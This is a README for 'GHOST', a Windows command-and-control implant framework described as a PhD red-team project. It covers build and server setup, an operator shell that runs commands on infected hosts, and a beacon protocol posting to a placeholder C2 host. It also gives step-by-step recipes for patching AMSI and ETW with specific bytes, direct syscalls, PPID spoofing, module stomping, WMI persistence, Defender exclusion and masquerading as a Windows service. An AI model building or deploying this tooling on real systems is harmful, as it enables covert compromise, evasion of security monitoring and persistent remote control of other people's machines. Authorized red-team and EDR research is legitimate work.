# GHOST — Windows C2 Implant Framework

> Research-grade command-and-control framework for red team operations.
> Built as a PhD final-year project studying EDR evasion and implant architecture.

---

## Architecture

```
┌───────────────────────────────────────────────────────────┐
│                     OPERATOR SIDE                         │
│                                                           │
│   ┌──────────┐     HTTPS (TLS 1.2+)     ┌────────────┐   │
│   │  c2_cli  │ ◄──────────────────────►  │  c2_server │   │
│   │ (Python) │   X-Operator-Token auth   │  (Flask)   │   │
│   └──────────┘                           └─────┬──────┘   │
│                                                │          │
│                                          ┌─────▼──────┐   │
│                                          │   SQLite    │   │
│                                          │  ghost.db   │   │
│                                          └────────────┘   │
└───────────────────────────────────────────────────────────┘
                           ▲
                           │ HTTPS POST /beacon, /result
                           │ X-Beacon-Token auth
                           │ Jittered interval (45-180s)
                           ▼
┌───────────────────────────────────────────────────────────┐
│                     IMPLANT SIDE                          │
│                                                           │
│   ┌──────────────────────────────────────────────────┐    │
│   │                  ghost.exe                       │    │
│   │                                                  │    │
│   │  ┌──────────┐  ┌──────────┐  ┌──────────────┐   │    │
│   │  │ Syscalls │  │ Evasion  │  │  Persistence │   │    │
│   │  │ (ntdll)  │  │ AMSI/ETW │  │  (WMI Sub)   │   │    │
│   │  └────┬─────┘  └────┬─────┘  └──────┬───────┘   │    │
│   │       │              │               │           │    │
│   │  ┌────▼──────────────▼───────────────▼───────┐   │    │
│   │  │              BeaconLoop                   │   │    │
│   │  │  WinHTTP → JSON → cmd.exe /C → result    │   │    │
│   │  └───────────────────────────────────────────┘   │    │
│   │                                                  │    │
│   │  ┌──────────────────────────────────────────┐    │    │
│   │  │  Injection (PPID spoof, module stomp)    │    │    │
│   │  └──────────────────────────────────────────┘    │    │
│   └──────────────────────────────────────────────────┘    │
│                                                           │
│   Target: Windows 10/11 x64 · Static CRT (/MT)           │
│   Subsystem: GUI (no console window)                      │
└───────────────────────────────────────────────────────────┘
```

---

## Components

| Component | File(s) | Description |
|---|---|---|
| **Direct Syscall Manager** | `src/syscalls.cpp`, `include/syscalls.hpp` | Extracts SSNs from clean ntdll copy, builds `mov r10,rcx; mov eax,SSN; syscall; ret` stubs |
| **Evasion Stack** | `src/evasion.cpp`, `include/evasion.hpp` | AMSI patch, ETW patch, hardware breakpoint clearing, Defender exclusion |
| **C2 Beacon** | `src/c2.cpp`, `include/c2.hpp` | WinHTTP HTTPS client with JSON protocol, adaptive backoff, auth tokens |
| **Command Execution** | `src/c2.cpp` | `CreateProcess` with pipe capture, 64 KB output cap, 30s timeout |
| **Injection** | `src/injection.cpp`, `include/injection.hpp` | PPID spoofing, remote process injection, module stomping |
| **Persistence** | `src/persistence.cpp`, `include/persistence.hpp` | WMI `CommandLineEventConsumer` + `__EventFilter` subscriptions |
| **Utilities** | `src/utils.cpp`, `include/utils.hpp` | UTF conversion, Base64, FNV-1a hashing, XOR cipher, jitter sleep |
| **C2 Server** | `server/c2_server.py` | Flask HTTPS listener with SQLite, token auth, rate limiting, audit log |
| **Operator CLI** | `server/c2_cli.py` | Interactive shell with session management, colored output, result polling |

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Implementation |
|---|---|---|
| T1106 | Native API | Direct syscalls via ntdll SSN extraction |
| T1055.001 | Process Injection: DLL Injection | `InjectRemoteProcess` — NtAllocate/Write/Protect/CreateThread |
| T1055.001 | Process Injection: Module Stomping | `StompModule` — overwrite .text of signed DLL |
| T1134.004 | Access Token Manipulation: PPID Spoofing | `SpawnWithPPID` — `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` |
| T1547.003 | Boot Persistence: WMI Event Subscription | `InstallWmiPersistence` — filter + consumer + binding |
| T1562.001 | Impair Defenses: Disable AMSI | `PatchAMSI` — patch `AmsiScanBuffer` |
| T1562.001 | Impair Defenses: Disable ETW | `PatchETW` — patch `EtwEventWrite` |
| T1071.001 | Application Layer Protocol: HTTPS | WinHTTP beacon over port 443 with JSON |
| T1573.001 | Encrypted Channel: Symmetric Crypto | XOR-encrypted C2 domain with hostname-derived key |
| T1036.005 | Masquerading: Match Legitimate Name | PE version info mimics Windows Security Health Service |

---

## Prerequisites

### Implant (C++)

| Requirement | Version | Notes |
|---|---|---|
| Visual Studio Build Tools | 2022 (v17+) | Need `cl.exe`, `rc.exe`, `link.exe` |
| Windows SDK | 10.0.19041+ | For `winhttp.h`, `wbemidl.h`, `winternl.h` |
| CMake *(optional)* | 3.20+ | Alternative to `build.ps1` |

### Server (Python)

| Requirement | Version |
|---|---|
| Python | 3.10+ |
| OpenSSL | Any (for cert generation) |

---

## Build Instructions

### Option A: PowerShell (Direct cl.exe)

```powershell
# 1. Open Developer PowerShell for VS 2022
#    Start Menu → "Developer PowerShell for VS 2022"
#    OR from a regular PowerShell:
cmd /c '"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat" && powershell'

# 2. Navigate to project root
cd C:\path\to\ghostimplant

# 3. Build release
.\build.ps1

# 4. Build debug (symbols, no optimization)
.\build.ps1 -Debug

# Output: build\ghost.exe
```

### Option B: CMake

```powershell
# 1. Open Developer PowerShell (same as above)

# 2. Configure
cmake -B build -G "Visual Studio 17 2022" -A x64

# 3. Build release
cmake --build build --config Release

# 4. Build debug
cmake --build build --config Debug

# Output: build\bin\Release\ghost.exe  or  build\bin\Debug\ghost.exe
```

### Build Output

| Config | Flags | Stack cookies | LTCG | Output |
|---|---|---|---|---|
| Release | `/O2 /GS- /GL` | Disabled | Yes | `build\ghost.exe` |
| Debug | `/Od /Zi` | Enabled | No | `build\ghost.exe` |

---

## Server Setup

### 1. Generate TLS Certificate

```bash
cd server/

# Self-signed cert for lab use (valid 365 days)
openssl req -x509 -newkey rsa:4096 \
  -keyout server.key -out server.crt \
  -days 365 -nodes \
  -subj "/CN=localhost"
```

### 2. Install Python Dependencies

```bash
pip install -r requirements.txt
```

### 3. Generate Auth Tokens

```bash
# Generate two separate tokens
python -c "import secrets; print('BEACON:', secrets.token_hex(32))"
python -c "import secrets; print('OPERATOR:', secrets.token_hex(32))"
```

### 4. Start the Server

```powershell
# Set tokens (PowerShell)
$env:GHOST_BEACON_TOKEN   = "<beacon_token_from_step_3>"
$env:GHOST_OPERATOR_TOKEN = "<operator_token_from_step_3>"

# Optional: configure session timeout (default: 600s)
$env:GHOST_SESSION_TIMEOUT = "600"

# Start
python c2_server.py
```

```bash
# Linux/macOS alternative
export GHOST_BEACON_TOKEN="<beacon_token>"
export GHOST_OPERATOR_TOKEN="<operator_token>"
python3 c2_server.py
```

Server starts on `0.0.0.0:443` with TLS.

### 5. Update Implant Config

Before building the implant, edit `src/c2.cpp`:

```cpp
// Replace with your beacon token
const wchar_t* BEACON_TOKEN = L"<same_beacon_token_as_server>";

// Replace with XOR-encrypted C2 server address
const uint8_t C2_DOMAIN_ENCRYPTED[] = { /* your encrypted bytes */ };
```

---

## Operator CLI Usage

```bash
# Set environment
export GHOST_OPERATOR_TOKEN="<your_operator_token>"
export GHOST_C2_URL="https://127.0.0.1"

# Or use flags
python c2_cli.py --token <TOKEN> --url https://10.0.0.1 <command>
```

### Commands

```bash
# List active sessions
python c2_cli.py sessions

# Queue a command
python c2_cli.py task <session_id> "whoami /all"

# Retrieve results
python c2_cli.py results <session_id>

# Interactive shell (auto-polls for results)
python c2_cli.py shell <session_id>

# Kill a session (queues 'exit' command)
python c2_cli.py kill <session_id>

# View operator audit log
python c2_cli.py audit --limit 50
```

### Interactive Shell

```
$ python c2_cli.py shell abc123
[*] Entering shell mode for session abc123
[*] Type 'bg' to background, 'exit' to kill session.

ghost(abc123)> whoami
[*] Waiting for result...
DESKTOP-LAB\admin

ghost(abc123)> ipconfig /all
[*] Waiting for result...
Windows IP Configuration
   Host Name . . . . . . . . : DESKTOP-LAB
   ...

ghost(abc123)> bg
[-] Backgrounding session (not killed).
```

---

## C2 Protocol

### Beacon (Implant → Server)

```
POST /beacon HTTP/1.1
Host: c2.example.com
Content-Type: application/json
X-Beacon-Token: <token>

{
  "session": "a1b2c3d4|admin",
  "recon": {
    "hostname": "DESKTOP-LAB",
    "user": "admin",
    "build": 22631,
    "elevated": true,
    "amsi": true,
    "etw": true,
    "hwbps": true
  }
}
```

**Response** (task queued):
```json
{"cmd": "whoami /all"}
```

**Response** (no task):
```json
{"cmd": "sleep"}
```

### Result (Implant → Server)

```
POST /result HTTP/1.1
Content-Type: application/json
X-Beacon-Token: <token>

{
  "session": "a1b2c3d4|admin",
  "output": "DESKTOP-LAB\\admin"
}
```

---

## Operational Security Features

| Feature | Detail |
|---|---|
| Static CRT | `/MT` — no `msvcrt.dll` dependency |
| GUI subsystem | No console window on execution |
| Jittered beacon | Uniform random sleep in `[45, 180]` seconds |
| Adaptive backoff | 3× sleep multiplier after 5 consecutive failures |
| XOR-encrypted strings | C2 domain encrypted with hostname-derived key |
| Benign IAT | Only Windows API imports; sensitive functions resolved dynamically |
| Legitimate metadata | PE version info mimics Windows Security Health Service |
| Token auth | Beacon and operator use separate tokens |
| TLS 1.2+ | Server enforces minimum TLS version |
| Rate limiting | Per-endpoint limits prevent abuse |
| Audit trail | All operator actions logged with timestamp and IP |

---

## Project Structure

```
ghostimplant/
├── include/
│   ├── c2.hpp              # Session struct, beacon/result/execute declarations
│   ├── config.hpp          # All tunable constants (tokens, timing, limits)
│   ├── evasion.hpp         # AMSI/ETW/HW BP/Defender exclusion declarations
│   ├── injection.hpp       # PPID spoof, remote inject, module stomp declarations
│   ├── persistence.hpp     # WMI persistence declarations
│   ├── syscalls.hpp        # Nt* function typedefs and SyscallTable struct
│   └── utils.hpp           # String conversion, Base64, hashing, system info
├── src/
│   ├── main.cpp            # WinMain entry point — init, evasion, persist, beacon
│   ├── c2.cpp              # WinHTTP transport, JSON, command execution, config defs
│   ├── evasion.cpp         # AMSI/ETW/HW BP patches (stubs — implement per research)
│   ├── injection.cpp       # Process injection techniques (stubs)
│   ├── persistence.cpp     # WMI event subscription persistence (stubs)
│   ├── syscalls.cpp        # SSN extraction and stub generation (stubs)
│   └── utils.cpp           # UTF conversion, Base64, FNV-1a, RtlGetVersion, jitter
├── resources/
│   ├── ghost.rc            # PE version info (mimics legitimate Microsoft binary)
│   └── ghost.manifest      # Application manifest (asInvoker, Win10/11 compat)
├── server/
│   ├── c2_server.py        # Flask HTTPS C2 listener with SQLite + auth + rate limiting
│   ├── c2_cli.py           # Operator CLI with interactive shell mode
│   └── requirements.txt    # Python dependencies
├── CMakeLists.txt          # CMake build config (Debug/Release, LTCG)
├── build.ps1               # PowerShell build script (direct cl.exe)
├── .gitignore
└── README.md
```

---

## Evasion Technique Reference

> **Note:** Evasion modules are provided as documented stubs with algorithm descriptions.
> Implementation is left to the researcher per their specific engagement scope.

| Technique | Algorithm (in stub comments) | Detection Surface |
|---|---|---|
| AMSI bypass | LoadLibrary `amsi.dll` → GetProcAddress `AmsiScanBuffer` → VirtualProtect RWX → patch `xor eax,eax; ret` | ETW `Microsoft-Antimalware-Scan-Interface`, Sysmon Event ID 7 |
| ETW bypass | GetProcAddress `EtwEventWrite` from ntdll → VirtualProtect RWX → patch `ret` (0xC3) | Kernel ETW provider audit, integrity checking |
| HW breakpoint clear | `CreateToolhelp32Snapshot` → enumerate threads → `GetThreadContext` → zero DR0-DR3 → `SetThreadContext` | Thread context modification events |
| Direct syscalls | Read clean ntdll from disk → parse PE exports → extract SSN from `4C 8B D1 B8 XX XX` pattern → build RWX stubs | Memory scanning for syscall stub patterns |
| PPID spoofing | `InitializeProcThreadAttributeList` → `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` → `CreateProcess` | Sysmon Event ID 1 (parent PID mismatch) |
| Module stomping | Map legitimate DLL → find .text RVA → VirtualProtect RW → overwrite with shellcode → restore RX | Memory integrity scanning, unbacked executable pages |
| WMI persistence | Connect `ROOT\subscription` → create `CommandLineEventConsumer` + `__EventFilter` + binding | Sysmon Event ID 19/20/21, WMI activity logs |

---

## Disclaimer

This tool is developed exclusively for **authorized security research and academic purposes**.
It is part of a PhD research project studying EDR evasion techniques and implant architecture.

- Do **not** use this tool against systems you do not own or have explicit written authorization to test.
- The authors are not responsible for misuse.
- All testing should be conducted in **isolated lab environments**.

---

## License

For academic/research use only. Not licensed for commercial or unauthorized use.